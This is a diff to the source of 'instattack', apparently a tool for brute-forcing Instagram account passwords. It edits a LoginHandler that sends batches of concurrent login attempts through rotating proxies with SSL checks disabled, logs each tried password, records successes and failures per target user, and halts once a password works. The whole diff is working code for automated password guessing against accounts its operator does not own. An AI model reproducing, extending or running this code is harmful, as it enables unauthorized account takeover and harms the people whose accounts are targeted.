@@ -4,7 +4,8 @@ import asyncio
 import aiohttp
 import aiojobs
 
-from instattack.lib.utils import percentage, limit_as_completed, cancel_remaining_tasks
+from instattack.lib.utils import (
+    percentage, limit_as_completed, cancel_remaining_tasks)
 
 from instattack.app.exceptions import NoPasswordsError
 from instattack.app.mixins import LoggerMixin
@@ -154,6 +155,8 @@ class LoginHandler(Handler):
 
         self.passwords = asyncio.Queue()
         self.lock = asyncio.Lock()
+
+        self.save_coros = []
         self.num_completed = 0
         self.num_passwords = 0  # Index for the current password and attempts per password.
 
@@ -166,6 +169,7 @@ class LoginHandler(Handler):
     async def attack(self, loop, limit=None):
         await self.prepopulate(loop, limit=limit)
         results = await self.attempt_login(loop)
+        await asyncio.gather(*self.save_coros)
         return results
 
     async def prepopulate(self, loop, limit=None):
@@ -194,15 +198,15 @@ class LoginHandler(Handler):
         return aiohttp.TCPConnector(
             ssl=False,
             force_close=True,
-            limit=self.config['attack']['connection']['limit'],
-            limit_per_host=self.config['attack']['connection']['limit_per_host'],
+            limit=self.config['connection']['limit'],
+            limit_per_host=self.config['connection']['limit_per_host'],
             enable_cleanup_closed=True,
         )
 
     @property
     def timeout(self):
         return aiohttp.ClientTimeout(
-            total=self.config['attack']['connection']['timeout']
+            total=self.config['connection']['timeout']
         )
 
     @property
@@ -225,10 +229,10 @@ class LoginHandler(Handler):
         return self._cookies
 
     async def proxy_callback(self, proxy):
-        loop = asyncio.get_event_loop()
-        loop.call_soon(asyncio.create_task(self.proxy_handler.pool.check_and_put(proxy)))
-        #loop.call_soon(asyncio.create_task(proxy.save()))
-        await self.schedule_task(proxy.save())
+        await self.proxy_handler.pool.check_and_put(proxy)
+        # loop = asyncio.get_event_loop()
+        # loop.call_soon(asyncio.create_task(self.proxy_handler.pool.check_and_put(proxy)))
+        # await self.schedule_task(proxy.save())
 
     async def login_task_generator(self, loop, session):
         """
@@ -281,35 +285,32 @@ class LoginHandler(Handler):
             timeout=self.timeout,
         ) as session:
             gen = self.login_task_generator(loop, session)
-            async for result, num_tries, current_tasks in limit_as_completed(
+            async for (result, num_tries), current_attempts, current_tasks in limit_as_completed(
                 gen, self.config['attack']['batch_size'], self.stop_event,
             ):
                 # Generator Does Not Yield None on No More Coroutines
                 if result.conclusive:
                     self.num_completed += 1
+                    results.add(result)
 
-                    await log.info(
-                        f'Percent Done: {percentage(self.num_completed, self.num_passwords)}')
+                    pct = percentage(self.num_completed, self.num_passwords)
+                    await log.info(f'{pct}', extra={
+                        'other': f'Num Attempts: {num_tries}',
+                        'password': result.password,
+                    })
 
+                    # Add Coroutine to Save/Update Attempt to Coroutine Array
+                    self.save_coros.append(self.user.create_or_update_attempt(
+                        result.password, success=result.authorized))
+
+                    # TODO: This Causes asyncio.CancelledError
+                    # await cancel_remaining_tasks(futures=current_tasks)
+
+                    # Stop Event: Notifies limit_as_completed to stop creating additional tasks
+                    # so that we can cancel the leftover ones.
                     if result.authorized:
-                        results.add(result)
-
-                        # Stop Event: Notifies limit_as_completed to stop creating additional tasks
-                        # so that we can cancel the leftover ones.
                         self.stop_event.set()
-                        await cancel_remaining_tasks(futures=current_tasks)
-
-                        await self.user.create_or_update_attempt(result.password, success=True)
                         break
-
-                    else:
-                        if not result.not_authorized:
-                            raise RuntimeError('Result should not be authorized.')
-
-                        results.add(result)
-                        await self.schedule_task(
-                            self.user.create_or_update_attempt(result.password, success=False)
-                        )
 
         await log.complete('Closing Session')
         await asyncio.sleep(0)
